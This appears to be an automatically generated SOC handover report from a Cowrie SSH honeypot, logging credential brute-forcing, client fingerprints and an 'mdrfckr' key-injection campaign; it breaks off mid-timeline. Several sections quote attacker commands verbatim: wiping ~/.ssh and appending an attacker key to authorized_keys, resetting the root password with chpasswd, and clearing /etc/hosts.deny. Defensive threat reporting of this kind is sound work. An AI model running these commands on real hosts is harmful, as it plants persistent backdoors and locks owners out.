# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-21 |
| **Generated At** | 2026-04-21T19:19:26Z |
| **Shift Time** | 19:19 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **137** |
| Confirmed Threats | **103** |
| False Positives Filtered | **34** (24.8%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **12** |
| High Severity Cases | **44** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **93** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **97** |
| Unique Credential Pairs | **56** |
| Unique Usernames | **26** |
| Unique Passwords | **56** |
| Successful Auth Pairs | **27** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 44 |
| `345gs5662d34` | 21 |
| `test` | 3 |
| `frappe` | 2 |
| `myuser` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 21 |
| `3245gs5662d34` | 21 |
| `admin1234` | 2 |
| `test333` | 1 |
| `Password123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 21 |
| `root` | `3245gs5662d34` | 21 |
| `admin1234` | `admin1234` | 2 |
| `test` | `test333` | 1 |
| `erpnext` | `Password123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `gianni` | `218.0.63.25` | 2026-04-21T17:42:49 |
| `root` | `Root123321..` | `191.101.59.254` | 2026-04-21T17:52:39 |
| `root` | `3245gs5662d34` | `191.101.59.254` | 2026-04-21T17:52:43 |
| `root` | `Zc123456.` | `69.5.0.120` | 2026-04-21T17:58:40 |
| `root` | `3245gs5662d34` | `69.5.0.120` | 2026-04-21T17:58:44 |
| `root` | `a12345678.` | `58.210.98.130` | 2026-04-21T18:41:30 |
| `root` | `ZAQ!2wsx2019$` | `77.87.40.114` | 2026-04-21T18:54:20 |
| `root` | `3245gs5662d34` | `77.87.40.114` | 2026-04-21T18:54:24 |
| `root` | `ddBB000` | `77.87.40.114` | 2026-04-21T18:56:47 |
| `root` | `Amir@123` | `77.87.40.114` | 2026-04-21T18:58:26 |
| `root` | `root111111.` | `77.87.40.114` | 2026-04-21T18:59:15 |
| `root` | `A123456..` | `77.87.40.114` | 2026-04-21T19:00:05 |
| `root` | `qwerty123456qwerty` | `4.247.141.61` | 2026-04-21T19:02:21 |
| `root` | `3245gs5662d34` | `4.247.141.61` | 2026-04-21T19:02:23 |
| `root` | `qwer1234!@#` | `77.87.40.114` | 2026-04-21T19:02:36 |
| `root` | `Qq!123456` | `4.247.141.61` | 2026-04-21T19:03:17 |
| `root` | `Test2026!` | `77.87.40.114` | 2026-04-21T19:03:30 |
| `root` | `qazwsx001@#` | `77.87.40.114` | 2026-04-21T19:05:10 |
| `root` | `Apple@123` | `77.87.40.114` | 2026-04-21T19:06:52 |
| `root` | `09N1RCa1Hs31` | `77.87.40.114` | 2026-04-21T19:08:34 |
| `root` | `root06!` | `4.247.141.61` | 2026-04-21T19:09:56 |
| `root` | `Qazwsx11111111@123` | `77.87.40.114` | 2026-04-21T19:11:09 |
| `root` | `Alibaba123` | `4.247.141.61` | 2026-04-21T19:11:52 |
| `root` | `A1234566` | `77.87.40.114` | 2026-04-21T19:12:47 |
| `root` | `P@ssw0rd777` | `77.87.40.114` | 2026-04-21T19:13:38 |
| `root` | `qazwsx1234!@` | `4.247.141.61` | 2026-04-21T19:13:48 |
| `root` | `781220` | `4.247.141.61` | 2026-04-21T19:16:44 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **137** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 99 |
| Unknown | 3 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 95 | 6 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `a704be057881...` | Mirai/variant | 2 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 95 | 6 | libssh-based |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `a704be057881...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 2 | 1 | — |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 21 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:jwVT35oncuYR"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `58.210.98.130`, `218.0.63.25`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `191.101.59.254`, `77.87.40.114`, `69.5.0.120`, `4.247.141.61`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **17** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS51396` | Pfcloud UG | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 1 | LOW |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS150436` | Byteplus Pte. Ltd. | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | LOW |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |
| `AS3301` | Telia Company AB | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (44)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-cac52ed5d2a6

| Field | Detail |
|---|---|
| **Source IP** | `218.0.63[.]25` |
| **First Seen** | 2026-04-21 17:42 |
| **Last Seen** | 2026-04-21 17:43 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:jwVT35oncuYR"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:42:48` | `cowrie.session.connect` |
| `2026-04-21 17:42:48` | `cowrie.client.version` |
| `2026-04-21 17:42:48` | `cowrie.client.kex` |
| `2026-04-21 17:42:49` | `cowrie.login.success` |
| `2026-04-21 17:42:49` | `cowrie.session.params` |
| `2026-04-21 17:42:49` | `cowrie.command.input` |
| `2026-04-21 17:42:49` | `cowrie.command.failed` |
| `2026-04-21 17:42:49` | `cowrie.log.closed` |
| `2026-04-21 17:42:50` | `cowrie.session.params` |
| `2026-04-21 17:42:50` | `cowrie.command.input` |
| `2026-04-21 17:42:50` | `cowrie.session.file_download` |
| `2026-04-21 17:42:50` | `cowrie.log.closed` |
| `2026-04-21 17:43:06` | `cowrie.session.params` |
| `2026-04-21 17:43:06` | `cowrie.command.input` |
| `2026-04-21 17:43:06` | `cowrie.log.closed` |
| `2026-04-21 17:43:07` | `cowrie.session.params` |
| `2026-04-21 17:43:07` | `cowrie.command.input` |
| `2026-04-21 17:43:07` | `cowrie.log.closed` |
| `2026-04-21 17:43:07` | `cowrie.session.params` |
| `2026-04-21 17:43:07` | `cowrie.command.input` |
| `2026-04-21 17:43:07` | `cowrie.session.file_download` |
| `2026-04-21 17:43:07` | `cowrie.log.closed` |
| `2026-04-21 17:43:07` | `cowrie.session.params` |
| `2026-04-21 17:43:07` | `cowrie.command.input` |
| `2026-04-21 17:43:08` | `cowrie.log.closed` |
| `2026-04-21 17:43:08` | `cowrie.session.params` |
| `2026-04-21 17:43:08` | `cowrie.command.input` |
| `2026-04-21 17:43:08` | `cowrie.log.closed` |
| `2026-04-21 17:43:08` | `cowrie.session.params` |
| `2026-04-21 17:43:08` | `cowrie.command.input` |
| `2026-04-21 17:43:08` | `cowrie.command.input` |
| `2026-04-21 17:43:09` | `cowrie.log.closed` |
| `2026-04-21 17:43:09` | `cowrie.session.params` |
| `2026-04-21 17:43:09` | `cowrie.command.input` |
| `2026-04-21 17:43:09` | `cowrie.log.closed` |
| `2026-04-21 17:43:09` | `cowrie.session.params` |
| `2026-04-21 17:43:09` | `cowrie.command.input` |
| `2026-04-21 17:43:10` | `cowrie.log.closed` |
| `2026-04-21 17:43:10` | `cowrie.session.params` |
| `2026-04-21 17:43:10` | `cowrie.command.input` |
| `2026-04-21 17:43:10` | `cowrie.log.closed` |
| `2026-04-21 17:43:10` | `cowrie.session.params` |
| `2026-04-21 17:43:10` | `cowrie.command.input` |
| `2026-04-21 17:43:10` | `cowrie.log.closed` |
| `2026-04-21 17:43:11` | `cowrie.session.params` |
| `2026-04-21 17:43:11` | `cowrie.command.input` |
| `2026-04-21 17:43:11` | `cowrie.log.closed` |
| `2026-04-21 17:43:11` | `cowrie.session.params` |
| `2026-04-21 17:43:11` | `cowrie.command.input` |
| `2026-04-21 17:43:11` | `cowrie.log.closed` |
| `2026-04-21 17:43:12` | `cowrie.session.params` |
| `2026-04-21 17:43:12` | `cowrie.command.input` |
| `2026-04-21 17:43:12` | `cowrie.log.closed` |
| `2026-04-21 17:43:12` | `cowrie.session.params` |
| `2026-04-21 17:43:12` | `cowrie.command.input` |
| `2026-04-21 17:43:12` | `cowrie.log.closed` |
| `2026-04-21 17:43:13` | `cowrie.session.params` |
| `2026-04-21 17:43:13` | `cowrie.command.input` |
| `2026-04-21 17:43:13` | `cowrie.log.closed` |
| `2026-04-21 17:43:13` | `cowrie.session.params` |
| `2026-04-21 17:43:13` | `cowrie.command.input` |
| `2026-04-21 17:43:13` | `cowrie.log.closed` |
| `2026-04-21 17:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.0.63[.]25` to AbuseIPDB if not already reported
- [ ] Block `218.0.63[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e75a4a076a7

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]254` |
| **First Seen** | 2026-04-21 17:52 |
| **Last Seen** | 2026-04-21 17:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:52:38` | `cowrie.session.connect` |
| `2026-04-21 17:52:38` | `cowrie.client.version` |
| `2026-04-21 17:52:38` | `cowrie.client.kex` |
| `2026-04-21 17:52:39` | `cowrie.login.success` |
| `2026-04-21 17:52:40` | `cowrie.session.params` |
| `2026-04-21 17:52:40` | `cowrie.command.input` |
| `2026-04-21 17:52:40` | `cowrie.command.failed` |
| `2026-04-21 17:52:40` | `cowrie.log.closed` |
| `2026-04-21 17:52:40` | `cowrie.session.params` |
| `2026-04-21 17:52:40` | `cowrie.command.input` |
| `2026-04-21 17:52:40` | `cowrie.session.file_download` |
| `2026-04-21 17:52:40` | `cowrie.log.closed` |
| `2026-04-21 17:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]254` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abeab370dd38

| Field | Detail |
|---|---|
| **Source IP** | `191.101.59[.]254` |
| **First Seen** | 2026-04-21 17:52 |
| **Last Seen** | 2026-04-21 17:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:52:43` | `cowrie.session.connect` |
| `2026-04-21 17:52:43` | `cowrie.client.version` |
| `2026-04-21 17:52:43` | `cowrie.client.kex` |
| `2026-04-21 17:52:43` | `cowrie.login.success` |
| `2026-04-21 17:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.101.59[.]254` to AbuseIPDB if not already reported
- [ ] Block `191.101.59[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbc1b063d38f

| Field | Detail |
|---|---|
| **Source IP** | `69.5.0[.]120` |
| **First Seen** | 2026-04-21 17:58 |
| **Last Seen** | 2026-04-21 17:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:58:39` | `cowrie.session.connect` |
| `2026-04-21 17:58:39` | `cowrie.client.version` |
| `2026-04-21 17:58:40` | `cowrie.client.kex` |
| `2026-04-21 17:58:40` | `cowrie.login.success` |
| `2026-04-21 17:58:41` | `cowrie.session.params` |
| `2026-04-21 17:58:41` | `cowrie.command.input` |
| `2026-04-21 17:58:41` | `cowrie.command.failed` |
| `2026-04-21 17:58:41` | `cowrie.log.closed` |
| `2026-04-21 17:58:41` | `cowrie.session.params` |
| `2026-04-21 17:58:41` | `cowrie.command.input` |
| `2026-04-21 17:58:41` | `cowrie.session.file_download` |
| `2026-04-21 17:58:41` | `cowrie.log.closed` |
| `2026-04-21 17:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.0[.]120` to AbuseIPDB if not already reported
- [ ] Block `69.5.0[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f10981786860

| Field | Detail |
|---|---|
| **Source IP** | `69.5.0[.]120` |
| **First Seen** | 2026-04-21 17:58 |
| **Last Seen** | 2026-04-21 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:58:43` | `cowrie.session.connect` |
| `2026-04-21 17:58:43` | `cowrie.client.version` |
| `2026-04-21 17:58:44` | `cowrie.client.kex` |
| `2026-04-21 17:58:44` | `cowrie.login.success` |
| `2026-04-21 17:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.0[.]120` to AbuseIPDB if not already reported
- [ ] Block `69.5.0[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3739701f4a12

| Field | Detail |
|---|---|
| **Source IP** | `58.210.98[.]130` |
| **First Seen** | 2026-04-21 18:41 |
| **Last Seen** | 2026-04-21 18:41 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:SMvYPO7ARdX7"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 18:41:29` | `cowrie.session.connect` |
| `2026-04-21 18:41:29` | `cowrie.client.version` |
| `2026-04-21 18:41:29` | `cowrie.client.kex` |
| `2026-04-21 18:41:30` | `cowrie.login.success` |
| `2026-04-21 18:41:30` | `cowrie.session.params` |
| `2026-04-21 18:41:30` | `cowrie.command.input` |
| `2026-04-21 18:41:30` | `cowrie.command.failed` |
| `2026-04-21 18:41:30` | `cowrie.log.closed` |
| `2026-04-21 18:41:30` | `cowrie.session.params` |
| `2026-04-21 18:41:30` | `cowrie.command.input` |
| `2026-04-21 18:41:30` | `cowrie.session.file_download` |
| `2026-04-21 18:41:30` | `cowrie.log.closed` |
| `2026-04-21 18:41:47` | `cowrie.session.params` |
| `2026-04-21 18:41:47` | `cowrie.command.input` |
| `2026-04-21 18:41:47` | `cowrie.log.closed` |
| `2026-04-21 18:41:47` | `cowrie.session.params` |
| `2026-04-21 18:41:47` | `cowrie.command.input` |
| `2026-04-21 18:41:47` | `cowrie.log.closed` |
| `2026-04-21 18:41:48` | `cowrie.session.params` |
| `2026-04-21 18:41:48` | `cowrie.command.input` |
| `2026-04-21 18:41:48` | `cowrie.session.file_download` |
| `2026-04-21 18:41:48` | `cowrie.log.closed` |
| `2026-04-21 18:41:48` | `cowrie.session.params` |
| `2026-04-21 18:41:48` | `cowrie.command.input` |
| `2026-04-21 18:41:48` | `cowrie.log.closed` |
| `2026-04-21 18:41:49` | `cowrie.session.params` |
| `2026-04-21 18:41:49` | `cowrie.command.input` |
| `2026-04-21 18:41:49` | `cowrie.log.closed` |
| `2026-04-21 18:41:49` | `cowrie.session.params` |
| `2026-04-21 18:41:49` | `cowrie.command.input` |
| `2026-04-21 18:41:49` | `cowrie.command.input` |
| `2026-04-21 18:41:49` | `cowrie.log.closed` |
| `2026-04-21 18:41:50` | `cowrie.session.params` |
| `2026-04-21 18:41:50` | `cowrie.command.input` |
| `2026-04-21 18:41:50` | `cowrie.log.closed` |
| `2026-04-21 18:41:50` | `cowrie.session.params` |
| `2026-04-21 18:41:50` | `cowrie.command.input` |
| `2026-04-21 18:41:50` | `cowrie.log.closed` |
| `2026-04-21 18:41:50` | `cowrie.session.params` |
| `2026-04-21 18:41:50` | `cowrie.command.input` |
| `2026-04-21 18:41:51` | `cowrie.log.closed` |
| `2026-04-21 18:41:51` | `cowrie.session.params` |
| `2026-04-21 18:41:51` | `cowrie.command.input` |
| `2026-04-21 18:41:51` | `cowrie.log.closed` |
| `2026-04-21 18:41:51` | `cowrie.session.params` |
| `2026-04-21 18:41:51` | `cowrie.command.input` |
| `2026-04-21 18:41:51` | `cowrie.log.closed` |
| `2026-04-21 18:41:52` | `cowrie.session.params` |
| `2026-04-21 18:41:52` | `cowrie.command.input` |
| `2026-04-21 18:41:52` | `cowrie.log.closed` |
| `2026-04-21 18:41:52` | `cowrie.session.params` |
| `2026-04-21 18:41:52` | `cowrie.command.input` |
| `2026-04-21 18:41:52` | `cowrie.log.closed` |
| `2026-04-21 18:41:53` | `cowrie.session.params` |
| `2026-04-21 18:41:53` | `cowrie.command.input` |
| `2026-04-21 18:41:53` | `cowrie.log.closed` |
| `2026-04-21 18:41:53` | `cowrie.session.params` |
| `2026-04-21 18:41:53` | `cowrie.command.input` |
| `2026-04-21 18:41:53` | `cowrie.log.closed` |
| `2026-04-21 18:41:54` | `cowrie.session.params` |
| `2026-04-21 18:41:54` | `cowrie.command.input` |
| `2026-04-21 18:41:54` | `cowrie.log.closed` |
| `2026-04-21 18:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.210.98[.]130` to AbuseIPDB if not already reported
- [ ] Block `58.210.98[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af029f0ac099

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 18:54 |
| **Last Seen** | 2026-04-21 18:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 18:54:19` | `cowrie.session.connect` |
| `2026-04-21 18:54:19` | `cowrie.client.version` |
| `2026-04-21 18:54:19` | `cowrie.client.kex` |
| `2026-04-21 18:54:20` | `cowrie.login.success` |
| `2026-04-21 18:54:20` | `cowrie.session.params` |
